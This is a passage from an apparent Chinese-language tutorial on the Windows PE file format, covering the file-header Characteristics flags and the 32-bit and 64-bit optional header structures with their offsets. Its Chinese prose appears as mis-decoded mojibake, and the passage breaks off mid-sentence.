¼çš„ç”±æ¥åŸæ¥æ˜¯è¿™å¼ å›¾ï¼Œæ¯ä¸€ä¸ªä½ä»£è¡¨å„è‡ªçš„å«ä¹‰ï¼Œä½†æ˜¯æ ¹æ®è¿™ä¸ªè¡¨æ¥æŸ¥æ–‡ä»¶å±æ€§è¦å°†å¾—åˆ°çš„å€¼æ‹†å¼€ã€‚æ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶çš„Characteristicså­—æ®µçš„å€¼ä¸º0102hã€‚0000 0001 0000 0010ã€‚ç¬¬2ä½ä¸º1ï¼Œæ ¹æ®ä¸‹è¡¨ï¼Œè¡¨ç¤ºæ–‡ä»¶å¯æ‰§è¡Œã€‚ç¬¬8ä½ä¸º1ï¼Œæ ¹æ®ä¸‹è¡¨ï¼Œè¡¨ç¤ºè¯¥PEæ–‡ä»¶åªåœ¨32ä½å¹³å°ä¸Šè¿è¡Œã€‚ä¸å¦‚ä¸‹é¢è¿™å¼ è¡¨ï¼Œç›´æ¥å†™æˆåå…­è¿›åˆ¶ï¼Œä¸ç”¨å°†æ¯ä½æ‹†æˆäºŒè¿›åˆ¶ä½ã€‚äºæ˜¯æˆ‘å°†ä¸Šè¿°ä¸¤å¼ è¡¨ä½œäº†åˆå¹¶å½¢æˆäº†è¡¨æ ¼ã€‚ 123456789101112131415#define IMAGE_FILE_RELOCS_STRIPPED 0x0001 // Relocation info stripped from file.#define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 // File is executable (i.e. no unresolved external references).#define IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 // Line nunbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 // Aggressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO 0x0080 // Bytes of machine word are reversed.#define IMAGE_FILE_32BIT_MACHINE 0x0100 // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED 0x0200 // Debugging info stripped from file in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 // If Image is on removable media, copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 // If Image is on Net, copy and run from the swap file.#define IMAGE_FILE_SYSTEM 0x1000 // System File.#define IMAGE_FILE_DLL 0x2000 // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 // File should only be run on a UP machine#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000 // Bytes of machine word are reversed. å½“Characteristicsæœ‰IMAGE_FILE_RELOCS_STRIPPEDå±æ€§æ—¶ï¼Œè¡¨æ˜è¯¥PEæ–‡ä»¶ä¸­ä¸åŒ…å«é‡å®šä½è¡¨ä¿¡æ¯ã€‚é‚£ä¹ˆè¯¥PEæ–‡ä»¶åªèƒ½åŠ è½½åˆ°å®ƒé¢„è®¾çš„ImageBaseï¼Œå¦‚æœè¿™ä¸ªåŸºå€è¢«å ç”¨ï¼Œç³»ç»ŸåŠ è½½å™¨ä¼šæŠ¥é”™ã€‚ ä¾‹ ä»win7åˆ†åˆ«æ‹·å‡ºäº†32ä½å’Œ64ä½çš„notepadï¼ŒæŸ¥çœ‹å®ƒä»¬æ ‡å‡†PEå¤´çš„å­—æ®µ 32ä½notepadè·¯å¾„ï¼šC:\\Windows\\SysWOW64 otepad.exe 64ä½notepadè·¯å¾„ï¼šC:\\Windows\\System32 otepad.exe notepad_32notepad_64 å­—æ®µ å€¼ å«ä¹‰ WORD Machine 014Ch å¯è¿è¡Œåœ¨Intel i386åŠåç»­çš„å‹å·CPU WORD NumberOfSections 4h Sectionçš„æ•°é‡ä¸º4 DWORD TimeDateStamp 4A5BC60Fh DWORD PointerToSymbolTable 0 DWORD NumberOfSymbols 0 WORD SizeOfOptionalHeader 0E0h æ‰©å±•PEå¤´çš„å¤§å°ä¸º0E0h WORD Characteristics 0102 æ–‡ä»¶å¯æ‰§è¡Œï¼Œåªåœ¨32ä½å¹³å°ä¸Šè¿è¡Œ å­—æ®µ å€¼ å«ä¹‰ WORD Machine 8664h å¯è¿è¡Œåœ¨64ä½çš„CPUå‹å· WORD NumberOfSections 6h Sectionçš„æ•°é‡ä¸º6 DWORD TimeDateStamp 4A5BC9B3h DWORD PointerToSymbolTable 0 DWORD NumberOfSymbols 0 WORD SizeOfOptionalHeader 0F0h æ‰©å±•PEå¤´çš„å¤§å°ä¸º0F0h WORD Characteristics 0022 æ–‡ä»¶å¯æ‰§è¡Œï¼Œåº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†è¶…è¿‡2GBçš„åœ°å€ æ‰©å±•PEå¤´ 32ä½å’Œ64ä½æ‰©å±•PEå¤´ä¸ä¸€æ ·ï¼Œä½†å®ƒä»¬çš„å·®å¼‚å¾ˆå°ï¼Œè¿™é‡Œä»¥32ä½çš„æ‰©å±•PEå¤´ä¸ºä¾‹è¿›è¡Œä»‹ç»ã€‚ 32ä½å’Œ64ä½æ‰©å±•PEå¤´winnt.hdiffç‰ˆPE32PE64123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;1234567891011121314151617181920212223242526272829303132typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;PE32+ç›¸æ¯”äºPE32ï¼šæ²¡æœ‰BaseOfDataæˆå‘˜ImageBaseã€SizeOfStackReserveã€SizeOfStackCommitã€SizeOfHeapReserveã€SizeOfHeapCommitæˆå‘˜ç”±DWORDå¢åŠ åˆ°äº†ULONGLONGã€‚DWORDï¼šunsigned longï¼Œ32ä½ï¼Œ4å­—èŠ‚ï¼›UNLONGLONGï¼šunsigned __int64ï¼Œ64ä½ï¼Œ8å­—èŠ‚ã€‚å‡å°‘äº†1ä¸ªDWORDï¼Œå¢åŠ äº†5ä¸ª4å­—èŠ‚ï¼Œæ‰€ä»¥PE32+çš„æ‰©å±•PEå¤´ç›¸æ¯”äºPE32çš„æ‰©å±•PEå¤´å¤§äº†16å­—èŠ‚ã€‚IMAGE_OPTIONAL_HEADER32ï¼ˆ224å­—èŠ‚ï¼‰-&gt;IMAGE_OPTIONAL_HEADER64ï¼ˆ240å­—èŠ‚ï¼‰PE32PE32+123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode;- DWORD BaseOfData;+ ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;+ ULONGLONG SizeOfStackReserve;+ ULONGLONG SizeOfStackCommit;+ ULONGLONG SizeOfHeapReserve;+ ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; winnt.hå¸¦åç§»ç‰ˆ123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // PE32ï¼š10Bh PE32+ï¼š20Bh BYTE MajorLinkerVersion; // é“¾æ¥å™¨ä¸»ç‰ˆæœ¬å· BYTE MinorLinkerVersion; // é“¾æ¥å™¨æ¬¡ç‰ˆæœ¬å· DWORD SizeOfCode; // æ‰€æœ‰ä»£ç èŠ‚çš„æ€»å’Œï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ DWORD SizeOfInitializedData; // åŒ…å«æ‰€æœ‰å·²ç»åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å°ï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ DWORD SizeOfUninitializedData; // åŒ…å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å°ï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ DWORD AddressOfEntryPoint; // ç¨‹åºå…¥å£ DWORD BaseOfCode; // ä»£ç å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ DWORD BaseOfData; // æ•°æ®å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ DWORD ImageBase; // å†…å­˜é•œåƒåŸºå€ DWORD SectionAlignment; // å†…å­˜å¯¹é½ DWORD FileAlignment; // æ–‡ä»¶å¯¹é½ WORD MajorOperatingSystemVersion; // æ ‡è¯†æ“ä½œç³»ç»Ÿç‰ˆæœ¬å·ï¼Œä¸»ç‰ˆæœ¬å· WORD MinorOperatingSystemVersion; // æ ‡è¯†æ“ä½œç³»ç»Ÿç‰ˆæœ¬å·ï¼Œæ¬¡ç‰ˆæœ¬å· WORD MajorImageVersion; // PEæ–‡ä»¶è‡ªèº«çš„ç‰ˆæœ¬å· WORD MinorImageVersion; // PEæ–‡ä»¶è‡ªèº«çš„ç‰ˆæœ¬å· WORD MajorSubsystemVersion; // è¿è¡Œæ‰€éœ€å­ç³»ç»Ÿç‰ˆæœ¬å· WORD MinorSubsystemVersion; // è¿è¡Œæ‰€éœ€å­ç³»ç»Ÿç‰ˆæœ¬å· DWORD Win32VersionValue; // å­ç³»ç»Ÿç‰ˆæœ¬çš„å€¼ï¼Œå¿…é¡»ä¸º0 DWORD SizeOfImage; // å†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ å°„çš„å°ºå¯¸ï¼Œå¯æ¯”å®é™…çš„å¤§ï¼Œæ˜¯SectionAlighmentçš„æ•´æ•°å€ DWORD SizeOfHeaders; // DOSå¤´+PEå¤´+èŠ‚è¡¨çš„å¤§å°æ€»å’Œï¼ŒæŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å° DWORD CheckSum; // æ ¡éªŒå’Œ ä¸€äº›ç³»ç»Ÿæ–‡ä»¶ä¼šæœ‰è¿™ä¸ªå€¼ï¼Œç”¨æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹ WORD Subsystem; // å­ç³»ç»Ÿï¼Œé©±åŠ¨ç¨‹åº(1)ã€å›¾å½¢ç•Œé¢(2) ã€æ§åˆ¶å°/DLL(3) WORD DllCharacteristics; // æ–‡ä»¶ç‰¹æ€§ï¼Œå¹¶ä¸åªå¯¹dllæ–‡ä»¶ DWORD SizeOfStackReserve; // åˆå§‹åŒ–æ—¶ä¿ç•™çš„æ ˆå¤§å° DWORD SizeOfStackCommit; // åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å¤§å° DWORD SizeOfHeapReserve; // åˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å° DWORD SizeOfHeapCommit; // åˆå§‹åŒ–æ—¶å®è·µæäº¤çš„å¤§å° DWORD LoaderFlags; // è°ƒè¯•ç›¸å…³ DWORD NumberOfRvaAndSizes; // ç›®å½•é¡¹æ•°ç›® IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // æ•°æ®ç›®å½•è¡¨ï¼Œç»“æ„ä½“æ•°ç»„&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;ä»¥ä¸‹çš„åç§»é‡æ˜¯åŸºäºPEæ–‡ä»¶å¤´ï¼ˆIMAGE_NT_HEADERSï¼‰ 12345678910111213141516171819202122232425262728293031323334typedef struct _IMAGE_OPTIONAL_HEADER &#123; +18h WORD Magic; // PE32ï¼š10Bh PE32+ï¼š20Bh +1Ah BYTE MajorLinkerVersion; // é“¾æ¥å™¨ä¸»ç‰ˆæœ¬å· +1Bh BYTE MinorLinkerVersion; // é“¾æ¥å™¨æ¬¡ç‰ˆæœ¬å· +1Ch DWORD SizeOfCode; // æ‰€æœ‰ä»£ç èŠ‚çš„æ€»å’Œï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ +20h DWORD SizeOfInitializedData; // åŒ…å«æ‰€æœ‰å·²ç»åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å°ï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ +24h DWORD SizeOfUninitializedData; // åŒ…å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å°ï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ +28h DWORD AddressOfEntryPoint; // ç¨‹åºå…¥å£ +2Ch DWORD BaseOfCode; // ä»£ç å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ +30h DWORD BaseOfData; // æ•°æ®å¼€å§‹çš„åŸºå€ï¼Œç¼–è¯‘å™¨å¡«çš„ï¼ˆæ²¡ç”¨ï¼‰ +34h DWORD ImageBase; // å†…å­˜é•œåƒåŸºå€ +38h DWORD SectionAlignment; // å†…å­˜å¯¹é½ +3Ch DWORD FileAlignment; // æ–‡ä»¶å¯¹é½ +40h WORD MajorOperatingSystemVersion; // æ ‡è¯†æ“ä½œç³»ç»Ÿç‰ˆæœ¬å·ï¼Œä¸»ç‰ˆæœ¬å· +42h WORD MinorOperatingSystemVersion; // æ ‡è¯†æ“ä½œç³»ç»Ÿç‰ˆæœ¬å·ï¼Œæ¬¡ç‰ˆæœ¬å· +44h WORD MajorImageVersion; // PEæ–‡ä»¶è‡ªèº«çš„ç‰ˆæœ¬å· +46h WORD MinorImageVersion; // PEæ–‡ä»¶è‡ªèº«çš„ç‰ˆæœ¬å· +48h WORD MajorSubsystemVersion; // è¿è¡Œæ‰€éœ€å­ç³»ç»Ÿç‰ˆæœ¬å· +4Ah WORD MinorSubsystemVersion; // è¿è¡Œæ‰€éœ€å­ç³»ç»Ÿç‰ˆæœ¬å· +4Ch DWORD Win32VersionValue; // å­ç³»ç»Ÿç‰ˆæœ¬çš„å€¼ï¼Œå¿…é¡»ä¸º0 +50h DWORD SizeOfImage; // å†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ å°„çš„å°ºå¯¸ï¼Œå¯æ¯”å®é™…çš„å¤§ï¼Œæ˜¯SectionAlighmentçš„æ•´æ•°å€ +54h DWORD SizeOfHeaders; // DOSå¤´+PEå¤´+èŠ‚è¡¨çš„å¤§å°æ€»å’Œï¼ŒæŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„å¤§å° +58h DWORD CheckSum; // æ ¡éªŒå’Œ ä¸€äº›ç³»ç»Ÿæ–‡ä»¶ä¼šæœ‰è¿™ä¸ªå€¼ï¼Œç”¨æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹ +5Ch WORD Subsystem; // å­ç³»ç»Ÿï¼Œé©±åŠ¨ç¨‹åº(1)ã€å›¾å½¢ç•Œé¢(2) ã€æ§åˆ¶å°/DLL(3) +5Eh WORD DllCharacteristics; // æ–‡ä»¶ç‰¹æ€§ï¼Œå¹¶ä¸åªå¯¹dllæ–‡ä»¶ +60h DWORD SizeOfStackReserve; // åˆå§‹åŒ–æ—¶ä¿ç•™çš„æ ˆå¤§å° +64h DWORD SizeOfStackCommit; // åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å¤§å° +68h DWORD SizeOfHeapReserve; // åˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å° +6Ch DWORD SizeOfHeapCommit; // åˆå§‹åŒ–æ—¶å®è·µæäº¤çš„å¤§å° +70h DWORD LoaderFlags; // è°ƒè¯•ç›¸å…³ +74h DWORD NumberOfRvaAndSizes; // ç›®å½•é¡¹æ•°ç›® +78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // æ•°æ®ç›®å½•è¡¨ï¼Œç»“æ„ä½“æ•°ç»„&#125;IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; åŠ ç²—çš„å­—æ®µæ˜¯é‡è¦å­—æ®µï¼Œä»£ç æ ·å¼çš„å­—æ®µäº†è§£å³å¯ Magicï¼šæ ‡è¯†å½“å‰PEæ–‡ä»¶æ˜¯PE32è¿˜æ˜¯PE32+ã€‚æ˜¯åˆ¤æ–­PEä½æ•°çš„å…³é”®å±æ€§ã€‚ä¹‹å‰è®²çš„ä¸€äº›å±æ€§ä¹Ÿèƒ½çœ‹å‡ºPEæ˜¯32è¿˜æ˜¯64ä½ï¼Œä½†é‚£äº›å±æ€§ä¸æ˜¯ç‰¹åˆ«å‡†ï¼Œæœ€å‡†ç¡®çš„æ˜¯è¿™ä¸ªå±æ€§ã€‚ PEçš„ä½æ•° å€¼ PE32 010Bh PE32+ 020Bh 12#define IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b#define IMAGE_NT_OPTIONAL_HDR64_MAGIC 0x20b MajorLinkerVersionï¼šé“¾æ¥å™¨çš„ä¸»ç‰ˆæœ¬å·ã€‚ç”±é“¾æ¥å™¨å¡«å†™çš„è¾…åŠ©æ€§ä¿¡æ¯ã€‚ MinorLinkerVersionï¼šé“¾æ¥å™¨çš„æ¬¡ç‰ˆæœ¬å·ã€‚ç”±é“¾æ¥å™¨å¡«å†™çš„è¾…åŠ©æ€§ä¿¡æ¯ã€‚ SizeOfCodeï¼šæœ‰IMAGE_SCN_CNT_CODEå±æ€§çš„åŒºå—çš„æ€»å¤§å°(åªå…¥ä¸èˆ)ï¼Œè¿™ä¸ªå€¼æ˜¯å·²å‘ä¸Šå¯¹é½åˆ°æŸä¸€ä¸ªå€¼çš„æ•´æ•°å€ã€‚ä¾‹å¦‚ï¼Œæœ¬ä¾‹æ˜¯200hï¼Œå³å¯¹é½çš„æ˜¯ä¸€ä¸ªç£ç›˜æ‰‡åŒºå­—èŠ‚æ•°ï¼ˆ200hï¼‰çš„æ•´æ•°å€ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œå¤šæ•°æ–‡ä»¶åªæœ‰1ä¸ªCodeå—ï¼Œæ‰€ä»¥è¿™ä¸ªå­—æ®µå’Œ.textå—çš„å¤§å°åŒ¹é…ã€‚ å¦‚æœæœ‰ä¸¤ä¸ªèŠ‚ï¼Œæ¯ä¸ªèŠ‚å¤§å°éƒ½æ˜¯10å­—èŠ‚ï¼ŒFileAlignmentæ˜¯200hã€‚é‚£ä¹ˆSizeOfCodeæ˜¯400hï¼ˆ2ä¸ª200hï¼‰ã€‚ SizeOfInitializedDataï¼šå·²åˆå§‹åŒ–æ•°æ®å—çš„å¤§å°ï¼Œå³åœ¨ç¼–è¯‘æ—¶æ‰€æ„æˆçš„å—çš„å¤§å°ï¼ˆä¸åŒ…æ‹¬ä»£ç æ®µ)ã€‚ä½†è¿™ä¸ªæ•°æ®ä¸å¤ªå‡†ç¡®ã€‚ æ¯”å¦‚å£°æ˜äº†ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œèµ‹äº†åˆå€¼ã€‚å°±æ˜¯å·²åˆå§‹åŒ–çš„æ•°æ® SizeOfUninitializedDataï¼šæœªåˆå§‹åŒ–æ•°æ®å—çš„å¤§å°ï¼Œè£…è½½ç¨‹åºè¦åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¸ºè¿™äº›æ•°æ®çº¦å®šç©ºé—´ã€‚è¿™äº›å—åœ¨ç£ç›˜æ–‡ä»¶ä¸­ä¸å ç©ºé—´ï¼Œå°±åƒâ€œUninitializedDataâ€è¿™ä¸€æœ¯è¯­æ‰€æš—ç¤ºçš„ä¸€æ ·ï¼Œè¿™äº›å—åœ¨ç¨‹åºå¼€å§‹è¿è¡Œæ—¶æ²¡æœ‰æŒ‡å®šå€¼ã€‚æœªåˆå§‹åŒ–æ•°æ®é€šå¸¸åœ¨.bsså—ä¸­ã€‚ æ¯”å¦‚å£°æ˜äº†ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ²¡æœ‰èµ‹åˆå€¼ã€‚å°±æ˜¯æœªåˆå§‹åŒ–çš„æ•°æ® SizeOfCodeã€SizeOfInitializedDataã€SizeOfUninitializedDataæ˜¯ç¼–è¯‘å™¨å¡«å†™çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œä¸å…·å¤‡å‚è€ƒæ„ä¹‰ã€‚ AddressOfEntryPointï¼šç¨‹åºæ‰§è¡Œå…¥å£RVAã€‚æŒ‡PEæ–‡ä»¶åœ¨å†…å­˜å±•å¼€åï¼Œç¨‹åºåœ¨å“ªä¸ªåœ°å€å¼€å§‹æ‰§è¡Œã€‚è¿™ä¸ªå€¼æ˜¯ç›¸å¯¹äºImageBaseçš„åç§»ã€‚ BaseOfCodeï¼šä»£ç æ®µçš„èµ·å§‹åœ°å€RVAã€‚è¿™ä¸ªå€¼æ˜¯ç›¸å¯¹äºImageBaseçš„åç§»ã€‚ BaseOfDataï¼šæ•°æ®æ®µçš„èµ·å§‹åœ°å€RVAã€‚è¿™ä¸ªå€¼æ˜¯ç›¸å¯¹äºImageBaseçš„åç§»ã€‚ ImageBaseï¼šå†…å­˜é•œåƒåŸºå€ã€‚æŒ‡PEæ–‡ä»¶åœ¨å†…å­˜ä¸­é¦–é€‰åœ¨å“ªä¸ªåœ°å€å¼€å§‹è½½å…¥æ‹‰ä¼¸ã€‚å¦‚æœç›®å‰æœ‰å…¶ä»–æ–‡ä»¶å æ®äº†è¿™ä¸ªåœ°å€ï¼Œè¦è¿›è¡ŒåŸºå€é‡å®šä½ã€‚å¯¹äºDLLè¿™ä¸ªå€¼é€šå¸¸å¹¶ä¸è¢«æ“ä½œç³»ç»Ÿé‡‡çº³ï¼Œå¦‚æœå¼€å¯äº†éšæœºåŸºå€çš„EXEä¹Ÿæ˜¯å¦‚æ­¤ã€‚ SectionAlignmentï¼šPEæ–‡ä»¶åœ¨å†…å­˜æ—¶çš„åŒºå—å¯¹é½å€¼ã€‚æ¯ä¸ªåŒºå—åœ¨è½½å…¥å†…å­˜æ—¶çš„åœ°å€å¿…é¡»æ˜¯è¯¥å­—æ®µæ•°å€¼çš„æ•´æ•°å€ã€‚é»˜è®¤çš„å¯¹é½å°ºå¯¸æ˜¯ç›®æ ‡CPUçš„é¡µå°ºå¯¸ã€‚å¯¹è¿è¡Œåœ¨Windows 9x/Meä¸‹çš„ç”¨æˆ·æ¨¡å¼å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæœ€å°çš„å¯¹é½å°ºå¯¸æ˜¯æ¯é¡µ1000h(4KB)ã€‚ FileAlignmentï¼šPEæ–‡ä»¶åœ¨ç£ç›˜ä¸Šæ—¶çš„åŒºå—å¯¹é½å€¼ã€‚æ¯ä¸ªåŒºå—åœ¨ç£ç›˜ä¸Šçš„åœ°å€å¿…é¡»æ˜¯è¯¥å­—æ®µæ•°å€¼çš„æ•´æ•°å€ã€‚å¯¹äºx86å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™ä¸ªå€¼é€šå¸¸æ˜¯200hæˆ–1000hï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯å—æ€»æ˜¯ä»ç£ç›˜çš„æ‰‡åŒºå¼€å§‹ã€‚è¿™ä¸ªå€¼å¿…é¡»æ˜¯2çš„å¹‚ï¼Œå…¶æœ€å°å€¼ä¸º200hã€‚ MajorOperatingSystemVersionï¼šè¦æ±‚æ“ä½œç³»ç»Ÿçš„æœ€ä½ç‰ˆæœ¬å·çš„ä¸»ç‰ˆæœ¬å·ã€‚ MinorOperatingSystemVersionï¼šè¦æ±‚æ“ä½œç³»ç»Ÿçš„æœ€ä½ç‰ˆæœ¬å·çš„æ¬¡ç‰ˆæœ¬å·ã€‚ MajorImageVersionï¼šè¯¥PEæ–‡ä»¶è‡ªèº«çš„ä¸»ç‰ˆæœ¬å·ï¼Œç”±ç¨‹åºå‘˜å®šä¹‰ã€‚ MinorImageVersionï¼šè¯¥PEæ–‡ä»¶è‡ªèº«çš„æ¬¡ç‰ˆæœ¬å·ï¼Œç”±ç¨‹åºå‘˜å®šä¹‰ã€‚ MajorSubsystemVersionï¼šè¦æ±‚æœ€ä½å­ç³»ç»Ÿç‰ˆæœ¬çš„ä¸»ç‰ˆæœ¬å·ã€‚è¿™ä¸ªå€¼ä¸ä¸‹ä¸€ä¸ªå­—æ®µä¸€èµ·ï¼Œé€šå¸¸è¢«è®¾ç½®ä¸º4ï¼Œå¯ä»¥é€šè¿‡é“¾æ¥å™¨å¼€å…³ISUBSYSTEMæ¥è®¾ç½®ã€‚ MinorSubsystemVersionï¼šè¦æ±‚æœ€ä½å­ç³»ç»Ÿç‰ˆæœ¬çš„æ¬¡ç‰ˆæœ¬å·ã€‚ Win32VersionValueï¼šå­ç³»ç»Ÿç‰ˆæœ¬çš„å€¼ï¼Œä»æ¥ä¸ç”¨çš„å­—æ®µï¼Œå¿…é¡»ä¸º0ï¼Œåˆ«çš„ä¸å¯ä»¥ã€‚ SizeOfImageï¼šå†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶æ˜ 